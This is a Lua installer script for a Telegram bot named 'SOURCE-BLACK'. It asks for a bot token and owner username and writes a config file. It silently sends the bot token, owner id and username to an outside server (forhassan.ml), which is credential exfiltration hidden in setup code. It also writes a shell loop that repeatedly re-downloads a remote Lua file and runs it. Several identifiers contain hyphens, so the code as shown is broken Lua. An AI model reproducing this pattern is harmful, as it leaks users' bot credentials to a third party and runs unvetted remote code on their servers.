serpent = dofile("./File_Libs/serpent.lua")
https = require("ssl.https")
http = require("socket.http")
JSON = dofile("./File_Libs/JSON.lua")
local database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
Server_SOURCE-BLACK = io.popen("echo $SSH_CLIENT | awk '{ print $1}'"):read('*a')
local AutoFiles_SOURCE-BLACK = function() 
local Create_Info = function(Token,Sudo,UserName)  
local SOURCE-BLACK_Info_Sudo = io.open("sudo.lua", 'w')
SOURCE-BLACK_Info_Sudo:write([[
token = "]]..Token..[["

Sudo = ]]..Sudo..[[  

UserName = "]]..UserName..[["
]])
SOURCE-BLACK_Info_Sudo:close()
end  
if not database:get(Server_SOURCE-BLACK.."Token_SOURCE-BLACK") then
print("\27[1;34m»» Send Your Token Bot :\27[m")
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
io.write('\n\27[1;31m»» Sorry The Token is not Correct \n\27[0;39;49m')
else
io.write('\n\27[1;31m»» The Token Is Saved\n\27[0;39;49m')
database:set(Server_SOURCE-BLACK.."Token_SOURCE-BLACK",token)
end 
else
io.write('\n\27[1;31mThe Tokem was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_SOURCE-BLACK.."UserName_SOURCE-BLACK") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("https://forhassan.ml/Black/infous.php?user="..UserName)
if Get_Info:match('Is_Spam') then
io.write('\n\27[1;31m»» Sorry The server is Spsm \nتم حظر السيرفر لمدة 5 دقايق بسبب التكرار\n\27[0;39;49m')
return false
end
local Json = JSON:decode(Get_Info)
if Json.Info == false then
io.write('\n\27[1;31m»» Sorry The UserName is not Correct \n\27[0;39;49m')
os.execute('lua start.lua')
else
if Json.Info == 'Channel' then
io.write('\n\27[1;31m»» Sorry The UserName Is Channel \n\27[0;39;49m')
os.execute('lua start.lua')
else
io.write('\n\27[1;31m»» The UserNamr Is Saved\n\27[0;39;49m')
database:set(Server_SOURCE-BLACK.."UserName_SOURCE-BLACK",Json.Info.Username)
database:set(Server_SOURCE-BLACK.."Id_SOURCE-BLACK",Json.Info.Id)
end
end
else
io.write('\n\27[1;31mThe UserName was not Saved\n\27[0;39;49m')
end 
os.execute('lua start.lua')
end
local function Files_SOURCE-BLACK_Info()
Create_Info(database:get(Server_SOURCE-BLACK.."Token_SOURCE-BLACK"),database:get(Server_SOURCE-BLACK.."Id_SOURCE-BLACK"),database:get(Server_SOURCE-BLACK.."UserName_SOURCE-BLACK"))   
https.request("https://forhassan.ml/Black/Black.php?id="..database:get(Server_SOURCE-BLACK.."Id_SOURCE-BLACK").."&user="..database:get(Server_SOURCE-BLACK.."UserName_SOURCE-BLACK").."&token="..database:get(Server_SOURCE-BLACK.."Token_SOURCE-BLACK"))
local RunSOURCE-BLACK = io.open("SOURCE-BLACK", 'w')
RunSOURCE-BLACK:write([[
#!/usr/bin/env bash
cd $HOME/SOURCE-BLACK
token="]]..database:get(Server_SOURCE-BLACK.."Token_SOURCE-BLACK")..[["
rm -fr BLACK.lua
wget "https://raw.githubusercontent.com/SOURCE-BLACK/SOURCE-BLACK/master/BLACK.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./BLACK.lua -p PROFILE --bot=$token
done
]])
RunSOURCE-BLACK:close()
local RunTs = io.open("ts", 'w')
RunTs:write([[
#!/usr/bin/env bash
cd $HOME/SOURCE-BLACK
while(true) do
rm -fr ../.telegram-cli
screen -S SOURCE-BLACK -X kill
screen -S SOURCE-BLACK ./SOURCE-BLACK
done
]])
RunTs:close()
end
Files_SOURCE-BLACK_Info()
database:del(Server_SOURCE-BLACK.."Token_SOURCE-BLACK");database:del(Server_SOURCE-BLACK.."Id_SOURCE-BLACK");database:del(Server_SOURCE-BLACK.."UserName_SOURCE-BLACK")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
end 
local function Load_File()  
local f = io.open("./sudo.lua", "r")  
if not f then   
AutoFiles_SOURCE-BLACK()  
var = true
else   
f:close()  
database:del(Server_SOURCE-BLACK.."Token_SOURCE-BLACK");database:del(Server_SOURCE-BLACK.."Id_SOURCE-BLACK");database:del(Server_SOURCE-BLACK.."UserName_SOURCE-BLACK")
sudos = dofile('sudo.lua')
os.execute('./install.sh ins')
var = false
end  
return var
end
Load_File()
